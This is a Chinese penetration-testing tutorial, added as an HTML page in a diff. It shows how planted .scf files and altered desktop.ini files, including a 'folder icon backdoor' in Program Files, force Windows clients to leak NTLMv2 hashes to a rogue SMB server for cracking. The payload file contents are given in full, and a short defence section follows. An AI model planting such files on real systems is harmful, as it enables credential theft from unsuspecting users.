@@ -1,0 +1,139 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="481c1ca1a1cddf4f5025f0824ed854c8">0x00 前言</h2>
+<hr/>
+<p>在文章《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》介绍了在服务器上通过Windows命令行抓包获取连接文件服务器的NTLMv2 Hash的方法，解决了一个有趣的问题：</p>
+<p><code>如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？</code></p>
+<p>本文将换一种实现方式，通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。</p>
+<h2 data-content="1" id="47d1c9c67ecd20419500fb67d154c7d4">0x01 简介</h2>
+<hr/>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>添加scf文件强制用户访问伪造的文件服务器</li>
+<li>修改文件夹图标强制用户访问伪造的文件服务器</li>
+<li>文件夹图标后门</li>
+<li>防御思路</li>
+</ul>
+<h2 data-content="1" id="2dd492db4525301225e8c0b3ebeabc98">0x02 实现思路</h2>
+<hr/>
+<p>利用SMB协议的特性，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录</p>
+<p>在用户访问文件服务器时，如果我们能够欺骗用户访问伪造的文件服务器，并在伪造的文件服务器上抓包，那么就能获得用户本机的NTLMv2 Hash</p>
+<p>所以关键是如何欺骗用户访问伪造的文件服务器，同时又保证隐蔽</p>
+<p>欺骗用户访问伪造的文件服务器的方法有多种(钓鱼方式暂略)，那么有没有当用户打开文件共享时，自动访问伪造文件服务器的方法呢？当然是有的，接下来主要介绍两种实现方式</p>
+<h2 data-content="1" id="8fd37cc21da56875113d6fb68ba3b539">0x03 添加scf文件强制用户访问伪造的文件服务器</h2>
+<hr/>
+<p>其他文章对该方法已经有过介绍，参考资料：</p>
+<p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/topic/1624">https://xianzhi.aliyun.com/forum/topic/1624</a></p>
+<p>这里简要介绍一下原理</p>
+<p><strong>scf文件：</strong></p>
+<p>SCF文件是"WINDOWS资源管理器命令"文件，是一种可执行文件,该类型文件由Windows Explorer Command解释，标准安装</p>
+<p>包含三种类型：</p>
+<ul>
+<li>Explorer.scf(资源管理器)</li>
+<li>Show Desktop.scf(显示桌面)</li>
+<li>View Channels.scf（查看频道）</li>
+</ul>
+<p>格式示例：</p>
+<pre><code>[Shell]
+Command=2
+IconFile=explorer.exe,3
+[Taskbar]
+Command=ToggleDesktop</code></pre>
+<p>IconFile属性支持UNC路径，也就是说，可以指定文件服务器上的某个文件，例如<code>IconFile=\\192.168.62.130\test\explorer.exe,3</code></p>
+<p>特别的地方： 使用Explore.exe打开包含该文件的路径时，由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，如果图标位于文件服务器，就会访问该文件服务器</p>
+<p>直观理解： 打开某一文件夹，该文件夹下面包含scf文件，scf文件的IconFile属性指向文件服务器，本机会自动访问该文件服务器，在访问过程中，默认先使用本机的用户名和密码hash尝试登录。如果文件服务器抓取数据包，就能够获得NTLMv2 Hash</p>
+<h3 data-content="1" id="e66f8512c01963f784af922702a0039f">实际测试：</h3>
+<p>正常文件服务器IP: 192.168.62.139</p>
+<p>伪造文件服务器IP： 192.168.62.130</p>
+<p>客户端IP： 192.168.62.135</p>
+<h4 data-content="1" id="8a057f98373da419a7be8fcbf1a5ec80">1、正常文件服务器共享目录下添加文件test.scf，内容如下：</h4>
+<pre><code>[Shell]
+Command=2
+IconFile=\\192.168.62.130\test\test.ico
+[Taskbar]
+Command=ToggleDesktop</code></pre>
+<p><strong>注：</strong></p>
+<p>IconFile指向伪造文件服务器，test.ico不存在</p>
+<h4 data-content="1" id="0a03a472c3939ac57ead7b0150958af5">2、在伪造文件服务器上使用wireshark进行抓包</h4>
+<h4 data-content="1" id="2c32b6ae956f31cc6a4f3d4c40b0b1b2">3、客户端访问正常文件服务器</h4>
+<h4 data-content="1" id="b039ae2f52d65b8dad3413b90f4bbe35">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>
+<p>如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180122173531-96f9ad5e-ff57-1.png"/></p>
+<p>构造特定格式<code>username::domain:challenge:HMAC-MD5:blob</code>，使用Hashcat破解即可</p>
+<p>具体破解方法可参考文章：</p>
+<p>《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</p>
+<p>《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</p>
+<p>经过实际测试，我们可以看到，利用的关键是要在文件服务器上添加scf文件，等待用户访问</p>
+<p>那么，有没有更为隐蔽的方法呢？</p>
+<h2 data-content="1" id="30241337dd15897247ada49cd9910aa9">0x04 修改文件夹图标强制用户访问伪造的文件服务器</h2>
+<hr/>
+<p>参考scf文件的利用原理，需要找到可以指定IconFile属性的特殊文件</p>
+<p>经过寻找，我找到了一个合适的方法： <code>修改文件夹图标强制用户访问伪造的文件服务器</code></p>
+<h3 data-content="1" id="dc50db73fbd0557d5e42ed24ab385c17">修改文件夹图标的方法：</h3>
+<p>选中<code>文件夹</code>-<code>右键</code>-<code>属性</code>-<code>自定义</code>-<code>更改图标</code>，如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180122173542-9d0f02ac-ff57-1.png"/></p>
+<p>更好后，在文件夹子目录生成文件desktop.ini，格式如下：</p>
+<pre><code>[.ShellClassInfo]
+IconResource=C:\Windows\system32\SHELL32.dll,3
+[ViewState]
+Mode=
+Vid=
+FolderType=Generic</code></pre>
+<p>尝试将IconResource属性替换为UNC路径，路径为<code>IconResource=\\192.168.62.130\test\SHELL32.dll,3</code></p>
+<p>测试成功</p>
+<h3 data-content="1" id="c5d678fa315c69df883fc7d502197ec1">实际测试：</h3>
+<p>正常文件服务器IP: 192.168.62.139</p>
+<p>伪造文件服务器IP： 192.168.62.130</p>
+<p>客户端IP： 192.168.62.135</p>
+<h4 data-content="1" id="5ff16ebeba38b76c273d09075915cf57">1、正常文件服务器共享目录的test文件夹下添加文件desktop.ini，内容如下：</h4>
+<pre><code>[.ShellClassInfo]
+IconResource=\\192.168.62.130\test\SHELL32.dll,4
+[ViewState]
+Mode=
+Vid=
+FolderType=Generic</code></pre>
+<p><strong>注：</strong></p>
+<p>IconResource指向伪造文件服务器，SHELL32.dll不存在</p>
+<h4 data-content="1" id="a029e8296cbffaab197a80a6a9ac7a23">2、在伪造文件服务器上使用wireshark进行抓包</h4>
+<h4 data-content="1" id="07c817ad488c6673e3bfac14a1fa0a77">3、客户端访问正常文件服务器</h4>
+<h4 data-content="1" id="40bccd13c879f4122285fca816c6b8eb">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>
+<p>如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180122173553-a41d9662-ff57-1.png"/></p>
+<p>通过这种方式，相比于scf文件，隐蔽性更高</p>
+<h2 data-content="1" id="a02a869ab1aea8fb88ffcf4b31f42526">0x05 文件夹图标后门</h2>
+<hr/>
+<p>原理同上，更改系统文件夹的配置文件desktop.ini，当用户打开指定文件夹时，将本机当前用户的NTLMv2 Hash发送至伪造文件服务器</p>
+<p>默认情况下，系统常见文件夹下包含配置文件desktop.ini，例如文件夹<code>Program Files</code>，desktop.ini内容如下：</p>
+<pre><code>[.ShellClassInfo]
+LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21781</code></pre>
+<p>尝试对其修改，添加如下内容：</p>
+<pre><code>IconResource=\\192.168.62.130\test\SHELL32.dll,4</code></pre>
+<p><strong>注：</strong></p>
+<p>需要管理员权限</p>
+<p>测试成功</p>
+<h3 data-content="1" id="b64b5b2a6152070ac894de5a409996f5">实际测试：</h3>
+<p>客户端IP: 192.168.62.139</p>
+<p>伪造文件服务器IP： 192.168.62.130</p>
+<h4 data-content="1" id="e2b1cc8184ac0c16b6b2c1810f6e292d">1、修改客户端文件，路径为C:\Program Files\desktop.ini，添加内容</h4>
+<pre><code>IconResource=\\192.168.62.130\test\SHELL32.dll,4</code></pre>
+<p><strong>注：</strong></p>
+<p>IconResource指向伪造文件服务器，SHELL32.dll不存在</p>
+<h4 data-content="1" id="5975e17b522cc67057ca0c8160775562">2、在伪造文件服务器上使用wireshark进行抓包</h4>
+<h4 data-content="1" id="f8092dd1d0406fca019fb484b0248668">3、客户端访问文件夹c:\</h4>
+<h4 data-content="1" id="d82c193b00e93a737447302465eb02d1">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>
+<p>如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180122173606-abe83afa-ff57-1.png"/></p>
+<p>通过这种方式，相比于scf文件，无需添加文件，但需要管理员权限</p>
+<h2 data-content="1" id="a6957d4cacb67e9e7746b49e9dd50403">0x06 防御思路</h2>
+<hr/>
+<p>结合攻击方法，总结防御思路如下：</p>
+<p>检查特殊文件.scf和desktop.ini，避免被添加UNC路径</p>
+<p>如无特殊需要，建议配置防火墙规则禁止139和445端口</p>
+<h2 data-content="1" id="ccac80cde1771df58bf3e914a720f5cf">0x07 小结</h2>
+<hr/>
+<p>本文换了一种方式，解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。</p>
+<p>通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。</p>
+<p>结合攻击方法，总结防御思路。</p>
+</div>
+</div>
